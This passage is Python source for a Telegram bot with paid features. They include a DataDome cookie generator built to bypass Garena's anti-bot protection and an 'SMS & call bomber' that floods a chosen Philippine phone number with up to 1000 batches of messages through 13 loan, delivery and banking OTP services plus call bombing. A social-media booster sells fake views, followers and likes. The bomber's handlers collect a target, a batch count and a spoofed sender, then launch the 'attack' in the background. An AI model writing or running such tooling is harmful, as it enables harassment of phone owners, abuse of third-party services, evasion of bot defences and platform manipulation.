        [InlineKeyboardButton("📁 ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴏᴋɪᴇ ғɪʟᴇ", callback_data="generate_datadome_file")],
        [InlineKeyboardButton("📖 ᴡʜᴀᴛ ɪs ᴅᴀᴛᴀᴅᴏᴍᴇ?", callback_data="datadome_info")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message_text = (
        "🛡️ **DataDome Cookie Generator** 🛡️\n\n"
        "Generate fresh DataDome cookies for bypassing anti-bot protection.\n\n"
        "**Features:**\n"
        "• Generate individual DataDome cookies\n"
        "• Create ready-to-use Python cookie files\n"
        "• Bypass Garena anti-bot protection\n\n"
        "Choose an option below to get started!"
    )

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def generate_datadome_cookie(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    await current_message.edit_text("🔄 **Generating DataDome cookie...** Please wait...")

    try:
        generator = DataDomeGenerator()
        datadome = generator.get_new_datadome()
        
        if datadome:
            result_message = (
                "✅ **DataDome Cookie Generated Successfully!** ✅\n\n"
                f"🍪 **Cookie Value:**\n"
                f"```\n{datadome}\n```\n\n"
                f"📝 **Usage:**\n"
                f"• Use this cookie in your requests to bypass DataDome protection\n"
                f"• Cookie will be valid for a limited time\n"
                f"• Generate a new one when it expires\n\n"
                f"⏰ **Generated:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        else:
            result_message = (
                "❌ **Failed to Generate DataDome Cookie**\n\n"
                "The cookie generation service might be temporarily unavailable.\n"
                "Please try again later or contact support if the issue persists."
            )
        
        keyboard = [
            [InlineKeyboardButton("🔄 ɢᴇɴᴇʀᴀᴛᴇ ᴀɴᴏᴛʜᴇʀ", callback_data="generate_datadome")],
            [InlineKeyboardButton("📁 ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇ", callback_data="generate_datadome_file")],
            [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data="datadome_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await current_message.edit_text(result_message, reply_markup=reply_markup, parse_mode="Markdown")
        
    except Exception as e:
        error_message = f"❌ **Error generating cookie:** `{str(e)}`"
        await current_message.edit_text(error_message, parse_mode="Markdown")

async def generate_datadome_file(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    await current_message.edit_text("🔄 **Generating DataDome cookie file...** Please wait...")

    try:
        generator = DataDomeGenerator()
        datadome = generator.get_new_datadome()
        
        if datadome:
            cookie_content = generator.generate_cookie_file(datadome)
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"datadome_cookie_{timestamp}.py"
            
            # Save file temporarily
            filepath = GENERATED_DIR / filename
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(cookie_content)
            
            # Send the file
            with open(filepath, "rb") as f:
                caption = (
                    f"📁 **DataDome Cookie File Generated** 📁\n\n"
                    f"🍪 **Cookie Value:** `{datadome[:50]}...`\n"
                    f"📝 **File Name:** `{filename}`\n"
                    f"⏰ **Generated:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"✨ **Usage:**\n"
                    f"• Import this file in your Python scripts\n"
                    f"• Use `get_cookies()` function to get the cookie dictionary\n"
                    f"• Perfect for automation scripts\n\n"
                    f"⚠️ **Note:** This file will auto-delete in 5 minutes"
                )
                
                await context.bot.send_document(
                    chat_id=current_message.chat_id,
                    document=f,
                    filename=filename,
                    caption=caption,
                    parse_mode="Markdown"
                )
            
            # Schedule file deletion
            asyncio.create_task(delete_generated_file(filepath))
            
        else:
            await current_message.edit_text(
                "❌ **Failed to generate DataDome cookie**\n\n"
                "Please try again later.",
                parse_mode="Markdown"
            )
            
    except Exception as e:
        error_message = f"❌ **Error generating cookie file:** `{str(e)}`"
        await current_message.edit_text(error_message, parse_mode="Markdown")

async def datadome_info(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    await current_message.edit_text(
        "📖 **What is DataDome?** 📖\n\n"
        "**DataDome** is a bot protection service used by many websites including Garena to prevent automated access.\n\n"
        "**How it works:**\n"
        "• Analyzes browser fingerprints and behavior\n"
        "• Blocks suspicious automated requests\n"
        "• Uses cookies to track session legitimacy\n\n"
        "**Why generate DataDome cookies?**\n"
        "• Bypass anti-bot protection for legitimate automation\n"
        "• Access Garena services programmatically\n"
        "• Test your applications against real protection\n\n"
        "**Important Notes:**\n"
        "⚠️ Use responsibly and ethically\n"
        "⚠️ Cookies have limited lifetime\n"
        "⚠️ Generate new cookies when old ones expire\n\n"
        "For technical support: @cluddydumpy",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴏᴋɪᴇ", callback_data="generate_datadome")],
            [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data="datadome_menu")]
        ])
    )

# ========== SMS BOMBER FUNCTIONS ==========
async def sms_bomber_menu(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        await current_message.edit_text("🛠️ **Bot is under maintenance!**", parse_mode="Markdown")
        return

    if not has_access(user_id):
        await current_message.edit_text("🔒 **Premium access required!**", parse_mode="Markdown")
        return

    keyboard = [
        [InlineKeyboardButton("🚀 ʟᴀᴜɴᴄʜ sᴍs ʙᴏᴍʙᴇʀ", callback_data="start_sms_bomber")],
        [InlineKeyboardButton("🛑 sᴛᴏᴘ ʀᴜɴɴɪɴɢ ᴀᴛᴛᴀᴄᴋ", callback_data="stop_sms_bomber")],
        [InlineKeyboardButton("📊 ʙᴏᴍʙᴇʀ sᴛᴀᴛɪsᴛɪᴄs", callback_data="bomber_stats")],
        [InlineKeyboardButton("ℹ️ ʙᴏᴍʙᴇʀ ɪɴғᴏ", callback_data="bomber_info")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message_text = (
        "💣 **SOLID SMS & CALL BOMBER PRO** 💣\n\n"
        "Advanced multi-service SMS and call bombing tool with 13 different services!\n\n"
        "**Features:**\n"
        "• 13 Different SMS Services\n"
        "• Call Bombing Service\n"
        "• Customizable Messages\n"
        "• Real-time Progress Tracking\n"
        "• Philippine Number Support\n\n"
        "⚠️ **Use responsibly and ethically!**"
    )

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def start_sms_bomber(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    
    # Check if user already has an active attack
    if user_id in BOMBER_ACTIVE_ATTACKS:
        await current_message.edit_text(
            "⚠️ **𝚈𝚘𝚞 𝚊𝚕𝚛𝚎𝚊𝚍𝚢 𝚑𝚊𝚟𝚎 𝚊𝚗 𝚊𝚌𝚝𝚒𝚟𝚎 𝚊𝚝𝚝𝚊𝚌𝚔!**\n\n"
            "𝙿𝚕𝚎𝚊𝚜𝚎 𝚜𝚝𝚘𝚙 𝚝𝚑𝚎 𝚌𝚞𝚛𝚛𝚎𝚗𝚝 𝚊𝚝𝚝𝚊𝚌𝚔 𝚋𝚎𝚏𝚘𝚛𝚎 𝚜𝚝𝚊𝚛𝚝𝚒𝚗𝚐 𝚊 𝚗𝚎𝚠 𝚘𝚗𝚎",
            parse_mode="Markdown"
        )
        return

    AWAITING_BOMBER_PHONE.add(user_id)
    
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message_text = (
        "📱 **𝚂𝙼𝚂 𝙱𝙾𝙼𝙱𝙴𝚁 - 𝚃𝙰𝚁𝙶𝙴𝚃 𝚂𝙴𝙻𝙴𝙲𝚃𝙸𝙾𝙽** 📱\n\n"
        "𝙿𝚕𝚎𝚊𝚜𝚎 𝚎𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚝𝚊𝚛𝚐𝚎𝚝 𝚙𝚑𝚘𝚗𝚎 numbe𝚛.\n\n"
        "**𝚅𝚊𝚕𝚒𝚍 𝙵𝚘𝚛𝚖𝚊𝚝𝚜:**\n"
        "• `09123456789`\n"
        "• `9123456789`\n"
        "• `+639123456789`\n\n"
        "⚠️ **𝙽𝚘𝚝𝚎:** 𝙾𝚗𝚕𝚢 𝙿𝚑𝚒𝚕𝚒𝚙𝚙𝚒𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛𝚜 𝚊𝚛𝚎 𝚜𝚞𝚙𝚙𝚘𝚛𝚝𝚎𝚍.\n"
        "⚠️ **𝚄𝚜𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚕𝚢!**"
    )

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_bomber_phone(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_BOMBER_PHONE:
        return

    phone_number = update.message.text.strip()
    
    # Validate phone number format
    import re
    if not re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', phone_number.replace(' ', '')):
        await update.message.reply_text(
            "❌ **𝙸𝚗𝚟𝚊𝚕𝚒𝚍 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚏𝚘𝚛𝚖𝚊𝚝!**\n\n"
            "𝙿𝚕𝚎𝚊𝚜𝚎 𝚞𝚜𝚎 𝚘𝚗𝚎 𝚘𝚏 𝚝𝚑𝚎𝚜𝚎 𝚏𝚘𝚛𝚖𝚊𝚝𝚜\n"
            "• `09123456789`\n"
            "• `9123456789`\n"
            "• `+639123456789`\n\n"
            "Try again:",
            parse_mode="Markdown"
        )
        return

    context.user_data['bomber_phone'] = phone_number
    AWAITING_BOMBER_PHONE.discard(user_id)
    AWAITING_BOMBER_AMOUNT.add(user_id)

    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "📊 **𝚂𝙼𝚂 𝙱𝙾𝙼𝙱𝙴𝚁 - 𝙱𝙰𝚃𝙲𝙷 𝙲𝙾𝚄𝙽𝚃** 📊\n\n"
        "𝙷𝚘𝚠 𝚖𝚊𝚗𝚢 𝚋𝚊𝚝𝚌𝚑𝚎𝚜 𝚠𝚘𝚞𝚕𝚍 𝚢𝚘𝚞 𝚕𝚒𝚔𝚎 𝚝𝚘 𝚜𝚎𝚗𝚍?\n\n"
        "**𝚁𝚎𝚌𝚘𝚖𝚖𝚎𝚗𝚍𝚎𝚜:** 1-10\n"
        "**𝙼𝚊𝚡𝚒𝚖𝚞𝚖:** 𝟷𝟶𝟶𝟶\n\n"
        "𝙴𝚊𝚌𝚑 𝚋𝚊𝚝𝚌𝚑 sends 𝚖𝚎𝚜𝚜𝚊𝚐𝚎𝚜 𝚝𝚘 𝚊𝚕𝚕 13 𝚜𝚎𝚛𝚟𝚒𝚌𝚎𝚜.\n"
        "𝙴𝚗𝚝𝚎𝚛 𝚊 𝚗𝚞𝚖𝚋𝚎𝚛:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def handle_bomber_amount(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_BOMBER_AMOUNT:
        return

    try:
        amount = int(update.message.text.strip())
        if amount < 1:
            await update.message.reply_text("❌ 𝙰𝚖𝚘𝚞𝚗𝚝 𝚖𝚞𝚜𝚝 𝚋𝚎 𝚊𝚝 𝚕𝚎𝚊𝚜𝚝 1. 𝚃𝚛𝚢 𝚊𝚐𝚊𝚒𝚗:")
            return
        if amount > 1000:
            await update.message.reply_text("⚠️ 𝙼𝚊𝚡𝚒𝚖𝚞𝚖 𝚒𝚜 1000 𝚋𝚊𝚝𝚌𝚑𝚎𝚜. 𝚂𝚎𝚝𝚝𝚒𝚗𝚐 𝚝𝚘 1000.")
            amount = 1000
    except ValueError:
        await update.message.reply_text("❌ 𝙿𝚕𝚎𝚊𝚜𝚎 𝚎𝚗𝚝𝚎𝚛 𝚊 𝚟𝚊𝚕𝚒𝚍 𝚗𝚞𝚖𝚋𝚎𝚛. 𝚃𝚛𝚢 𝚊𝚐𝚊𝚒𝚗:")
        return

    context.user_data['bomber_amount'] = amount
    AWAITING_BOMBER_AMOUNT.discard(user_id)
    AWAITING_BOMBER_SENDER.add(user_id)

    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "✏️ **𝚂𝙼𝚂 𝙱𝙾𝙼𝙱𝙴𝚁 - 𝚂𝙴𝙽𝙳𝙴𝚁 𝙽𝙰𝙼𝙴** ✏️\n\n"
        "𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚜𝚎𝚗𝚍𝚎𝚛 𝚗𝚊𝚖𝚎 𝚏𝚘𝚛 𝚌𝚞𝚜𝚝𝚘𝚖 𝚂𝙼𝚂 𝚖𝚎𝚜𝚜𝚊𝚐𝚎𝚜:\n\n"
        "**𝙴𝚡𝚊𝚖𝚙𝚕𝚎:** `𝙹𝚘𝚑𝚗` 𝚘𝚛 `𝙲𝚞𝚜𝚝𝚘𝚖𝚎𝚛 𝚂𝚎𝚛𝚟𝚒𝚌𝚎`\n\n"
        "𝚃𝚑𝚒𝚜 𝚠𝚒𝚕𝚕 𝚋𝚎 𝚞𝚜𝚎𝚍 𝚏𝚘𝚛 𝚙𝚎𝚛𝚜𝚘𝚗𝚊𝚕𝚒𝚣𝚎𝚍 𝚂𝙼𝚂.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def handle_bomber_sender(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_BOMBER_SENDER:
        return

    sender_name = update.message.text.strip()
    if not sender_name:
        sender_name = "User"

    context.user_data['bomber_sender'] = sender_name
    AWAITING_BOMBER_SENDER.discard(user_id)
    AWAITING_BOMBER_MESSAGE.add(user_id)

    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "💬 **𝚂𝙼𝚂 𝙱𝙾𝙼𝙱𝙴𝚁 - 𝙼𝙴𝚂𝚂𝙰𝙶𝙴 𝙲𝙾𝙽𝚃𝙴𝙽𝚃** 💬\n\n"
        "𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚌𝚞𝚜𝚝𝚘𝚖 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚘 𝚜𝚎𝚗𝚍:\n\n"
        "**𝙴𝚡𝚊𝚖𝚙𝚕𝚎:** `𝚈𝚘𝚞𝚛 𝚟𝚎𝚛𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 𝚌𝚘𝚍𝚎 𝚒𝚜: 123456`\n"
        "**𝙽𝚘𝚝𝚎:** 𝚃𝚑𝚎 𝚜𝚞𝚏𝚏𝚒𝚡 `-freed0m` 𝚠𝚒𝚕𝚕 𝚋𝚎 𝚊𝚞𝚝𝚘𝚖𝚊𝚝𝚒𝚌𝚊𝚕𝚕𝚢 𝚊𝚍𝚍𝚎𝚍.\n\n"
        "𝙴𝚗𝚝𝚎𝚛 𝚢𝚘𝚞𝚛 𝚖𝚎𝚜𝚜𝚊𝚐𝚎:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def handle_bomber_message(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_BOMBER_MESSAGE:
        return

    message_content = update.message.text.strip()
    if not message_content:
        message_content = "Test Message"

    context.user_data['bomber_message'] = message_content
    AWAITING_BOMBER_MESSAGE.discard(user_id)

    # Get all data from context
    phone = context.user_data.get('bomber_phone')
    amount = context.user_data.get('bomber_amount', 1)
    sender = context.user_data.get('bomber_sender', "User")
    message = context.user_data.get('bomber_message', "Test Message")

    # Create bomber instance
    bomber = SMSBomber(user_id)
    # Set custom data directly
    bomber.custom_sender_name = sender
    bomber.custom_message = message
    
    # Store bomber instance
    BOMBER_ACTIVE_ATTACKS[user_id] = bomber

    # Start the attack in background
    asyncio.create_task(run_bomber_attack(bomber, phone, amount, context, update.message.chat_id))

    # Send confirmation
    await update.message.reply_text(
        f"**𝙰𝚃𝚃𝙰𝙲𝙺 𝙸𝙽𝙸𝚃𝙸𝙰𝚃𝙴𝙳!**\n\n"
        f"🎯 **𝚃𝚊𝚛𝚐𝚎𝚝:** `{phone}`\n"
        f"📊 **𝙱𝚊𝚝𝚌𝚑𝚎𝚜:** {amount}\n"
        f"👤 **𝚂𝚎𝚗𝚍𝚎𝚛:** {sender}\n"
        f"💬 **𝙼𝚎𝚜𝚜𝚊𝚐𝚠:** {message}\n\n"
        "⏳ *𝚂𝚝𝚊𝚛𝚝𝚒𝚗𝚐 𝚊𝚝𝚝𝚊𝚌𝚔 𝚒𝚗 background...*\n"
        "𝚈𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚙𝚛𝚘𝚐𝚛𝚎𝚜𝚜 𝚞𝚙𝚍𝚊𝚝𝚎𝚜 𝚑𝚎𝚛𝚎.",
        parse_mode="Markdown"
    )

async def run_bomber_attack(bomber: SMSBomber, phone: str, amount: int, context: CallbackContext, chat_id: int):
    """Run the bomber attack in background"""
    try:
        await bomber.execute_attack(phone, amount, context, chat_id)
    except Exception as e:
        logging.error(f"Bomber attack error: {e}")
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ **Attack Failed!**\n\nError: `{str(e)}`",
            parse_mode="Markdown"
        )
    finally:
        # Remove from active attacks
        if bomber.user_id in BOMBER_ACTIVE_ATTACKS:
            del BOMBER_ACTIVE_ATTACKS[bomber.user_id]

async def stop_sms_bomber(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    
    if user_id in BOMBER_ACTIVE_ATTACKS:
        bomber = BOMBER_ACTIVE_ATTACKS[user_id]
        bomber.stop_attack()
        
        # Get stats before removing
        stats = {
            "success": bomber.success_count,
            "failed": bomber.fail_count,
            "total": bomber.success_count + bomber.fail_count,
            "batches": bomber.current_batch
        }
        
        del BOMBER_ACTIVE_ATTACKS[user_id]
        
        await current_message.edit_text(
            "🛑 **𝙰𝚃𝚃𝙰𝙲𝙺 𝚂𝚃𝙾𝙿𝙿𝙴𝙳** 🛑\n\n"
            f"✅ **𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝙼𝚎𝚜𝚜𝚊𝚐𝚎𝚜:** {stats['success']}\n"
            f"❌ **Failed 𝙼𝚎𝚜𝚜𝚊𝚐𝚎𝚜:** {stats['failed']}\n"
            f"📊 **𝙱𝚊𝚝𝚌𝚑𝚎𝚜 𝙲𝚘𝚖𝚙𝚕𝚎𝚝𝚎𝚍:** {stats['batches']}\n"
            f"📈 **𝚃𝚘𝚝𝚊𝚕 𝙰𝚝𝚝𝚎𝚖𝚙𝚝𝚜:** {stats['total']}\n\n"
            "𝚃𝚑𝚎 𝚊𝚝𝚝𝚊𝚌𝚔 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚝𝚎𝚛𝚖𝚒𝚗𝚊𝚝𝚎𝚍.",
            parse_mode="Markdown"
        )
    else:
        await current_message.edit_text(
            "ℹ️ **𝙽𝚘 𝙰𝚌𝚝𝚒𝚟𝚎 𝙰𝚝𝚝𝚊𝚌𝚔**\n\n"
            "𝚈𝚘𝚞 𝚍𝚘𝚗'𝚝 𝚑𝚊𝚟𝚎 𝚊𝚗𝚢 𝚛𝚞𝚗𝚗𝚒𝚗𝚐 𝚊𝚝𝚝𝚊𝚌𝚔𝚜 𝚝𝚘 𝚜𝚝𝚘𝚙.",
            parse_mode="Markdown"
        )

async def bomber_stats(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    
    if user_id in BOMBER_ACTIVE_ATTACKS:
        bomber = BOMBER_ACTIVE_ATTACKS[user_id]
        stats_text = (
            "📊 **𝙰𝙲𝚃𝙸𝚅𝙴 𝙰𝚃𝚃𝙰𝙲𝙺 𝚂𝚃𝙰𝚃𝙸𝚂𝚃𝙸𝙲𝚂** 📊\n\n"
            f"🔄 **𝙲𝚞𝚛𝚛𝚎𝚗𝚝 𝙱𝚊𝚝𝚌𝚑:** {bomber.current_batch}/{bomber.total_batches}\n"
            f"✅ **𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝙼𝚎𝚜𝚜𝚊𝚐𝚎𝚜:** {bomber.success_count}\n"
            f"❌ **𝙵𝚊𝚒𝚕𝚎𝚍 𝙼𝚎𝚜𝚜𝚊𝚐𝚎𝚜:** {bomber.fail_count}\n"
            f"📈 **𝚃𝚘𝚝𝚊𝚕 𝙰𝚝𝚝𝚎𝚖𝚙𝚝𝚜:** {bomber.success_count + bomber.fail_count}\n\n"
            "⚡ *𝙰𝚝𝚝𝚊𝚌𝚔 𝚒𝚜 𝚌𝚞𝚛𝚛𝚎𝚗𝚝𝚕𝚢 𝚛𝚞𝚗𝚗𝚒𝚗𝚐...*"
        )
    else:
        stats_text = (
            "📊 **𝙱𝙾𝙼𝙱𝙴𝚁 𝚂𝚃𝙰𝚃𝙸𝚂𝚃𝙸𝙲𝚂** 📊\n\n"
            "ℹ️ **𝙽𝚘 𝙰𝚌𝚝𝚒𝚟𝚎 𝙰𝚝𝚝𝚊𝚌𝚔𝚊**\n\n"
            "𝚂𝚝𝚊𝚛𝚝 𝚊𝚗 𝚊𝚝𝚝𝚊𝚌𝚔 𝚝𝚘 𝚜𝚎𝚎 𝚜𝚝𝚊𝚝𝚒𝚜𝚝𝚒𝚌𝚜 𝚑𝚎𝚛𝚎."
        )
    
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data="sms_bomber_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await current_message.edit_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")

async def bomber_info(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    info_text = (
        "ℹ️ **SOLID SMS & CALL BOMBER PRO** ℹ️\n\n"
        "**Available Services (13 Total):**\n"
        "1. **Custom SMS** - Personalized messaging\n"
        "2. **EZLOAN** - Loan service OTP\n"
        "3. **XPRESS PH** - Delivery service\n"
        "4. **ABENSON** - Appliance store OTP\n"
        "5. **Excellent Lending** - Loan provider\n"
        "6. **Fortune Pay** - Payment service\n"
        "7. **WEMOVE** - Moving service\n"
        "8. **LBC Connect** - Delivery service\n"
        "9. **Pickup Coffee** - Coffee shop app\n"
        "10. **Honey Loan** - Loan service\n"
        "11. **KOMO PH** - Digital banking\n"
        "12. **S5.COM** - Gaming platform\n"
        "13. **Call Bomb** - Call bombing service\n\n"
        "**Features:**\n"
        "• Multi-service concurrent attacks\n"
        "• Customizable messages\n"
        "• Real-time progress tracking\n"
        "• Philippine number support\n"
        "• Background execution\n\n"
        "⚠️ **Important Notes:**\n"
        "• Use responsibly and ethically\n"
        "• Don't exceed reasonable limits\n"
        "• Some services may have rate limits\n"
        "• Call bombing service may have delays\n\n"
        "📞 **Support:** @Khatelynnnnnn"
    )
    
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data="sms_bomber_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await current_message.edit_text(info_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(info_text, reply_markup=reply_markup, parse_mode="Markdown")

# ========== SOCIAL MEDIA BOOSTER FUNCTIONS ==========
async def social_media_booster_menu(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        await current_message.edit_text("🛠️ **Bot is under maintenance!**", parse_mode="Markdown")
        return

    if not has_access(user_id):
        await current_message.edit_text("🔒 **Premium access required!**", parse_mode="Markdown")
        return

    keyboard = [
        [InlineKeyboardButton("🎵 ᴛɪᴋᴛᴏᴋ ᴠɪᴇᴡs ʙᴏᴏsᴛ", callback_data="boost_tiktok_views"),
         InlineKeyboardButton("👥 ᴛɪᴋᴛᴏᴋ ғᴏʟʟᴏᴡᴇʀs ʙᴏᴏsᴛ", callback_data="boost_tiktok_followers")],
        [InlineKeyboardButton("❤️ ᴛɪᴋᴛᴏᴋ ʟɪᴋᴇs ʙᴏᴏsᴛ", callback_data="boost_tiktok_likes"),
         InlineKeyboardButton("📢 ᴛᴇʟᴇɢʀᴀᴍ ᴠɪᴇᴡs ʙᴏᴏsᴛ", callback_data="boost_telegram_views")],
        [InlineKeyboardButton("📘 ғᴀᴄᴇʙᴏᴏᴋ ʙᴏᴏsᴛ", callback_data="boost_facebook"),
         InlineKeyboardButton("📷 ɪɴsᴛᴀɢʀᴀᴍ ᴠɪᴇᴡs ʙᴏᴏsᴛ", callback_data="boost_instagram_views")],
        [InlineKeyboardButton("🐦 ᴛᴡɪᴛᴛᴇʀ ᴠɪᴇᴡs ʙᴏᴏsᴛ", callback_data="boost_twitter_views"),
         InlineKeyboardButton("▶️ ʏᴏᴜᴛᴜʙᴇ ᴠɪᴇᴡs ʙᴏᴏsᴛ", callback_data="boost_youtube_views")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message_text = (
        "🚀 **SOCIAL MEDIA BOOSTER PRO** 🚀\n\n"
        "Boost your social media presence with our powerful boosting tool!\n\n"
        "**Available Services:**\n"
        "• **TikTok**: Views, Followers, Likes\n"
        "• **Telegram**: Views\n"
        "• **Facebook**: Shares/Views\n"
        "• **Instagram**: Views\n"
        "• **Twitter**: Views\n"
        "• **YouTube**: Views\n\n"
        "**Features:**\n"
        "• Fast and reliable boosting\n"
        "• Real-time progress tracking\n"
        "• Multiple platform support\n"
        "• Free service (no charges)\n\n"
        "Select a boosting service below to get started!"
    )

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def start_boost_process(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    query = update.callback_query
    await query.answer()

    user_id = update.effective_user.id
    
    # Store boost type in context
    boost_type = query.data
    context.user_data['boost_type'] = boost_type
    
    # Define URL validation patterns
    url_patterns = {
        'boost_tiktok_views': ['tiktok.com'],
        'boost_tiktok_followers': ['tiktok.com'],
        'boost_tiktok_likes': ['tiktok.com'],
        'boost_telegram_views': ['t.me', 'telegram.me'],
        'boost_facebook': ['facebook.com'],
        'boost_instagram_views': ['instagram.com'],
        'boost_twitter_views': ['twitter.com', 'x.com'],
        'boost_youtube_views': ['youtube.com', 'youtu.be']
    }
    
    # Get service names for display
    service_names = {
        'boost_tiktok_views': 'TikTok Views',
        'boost_tiktok_followers': 'TikTok Followers',
        'boost_tiktok_likes': 'TikTok Likes',
        'boost_telegram_views': 'Telegram Views',
        'boost_facebook': 'Facebook',
        'boost_instagram_views': 'Instagram Views',
        'boost_twitter_views': 'Twitter Views',
        'boost_youtube_views': 'YouTube Views'
    }
    
    service_name = service_names.get(boost_type, 'Unknown')
    patterns = url_patterns.get(boost_type, [])
    
    # Set user state
    AWAITING_BOOST_URL.add(user_id)
    
    # Create URL examples
    examples = {
        'boost_tiktok_views': 'https://www.tiktok.com/@username/video/1234567890',
        'boost_tiktok_followers': 'https://www.tiktok.com/@username',
        'boost_tiktok_likes': 'https://www.tiktok.com/@username/video/1234567890',
        'boost_telegram_views': 'https://t.me/channel/123',
        'boost_facebook': 'https://www.facebook.com/post/123456',
        'boost_instagram_views': 'https://www.instagram.com/p/AbCdEfGHiJk/',
        'boost_twitter_views': 'https://twitter.com/user/status/1234567890',
        'boost_youtube_views': 'https://www.youtube.com/watch?v=AbCdEfGHiJk'
    }
    
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message_text = (
        f"🚀 **{service_name} Boosting** 🚀\n\n"
        f"Please send the target URL for {service_name} boosting.\n\n"
        f"**Valid URL must contain:** {', '.join(patterns)}\n"
        f"**Example:** `{examples.get(boost_type, 'Enter valid URL')}`\n\n"
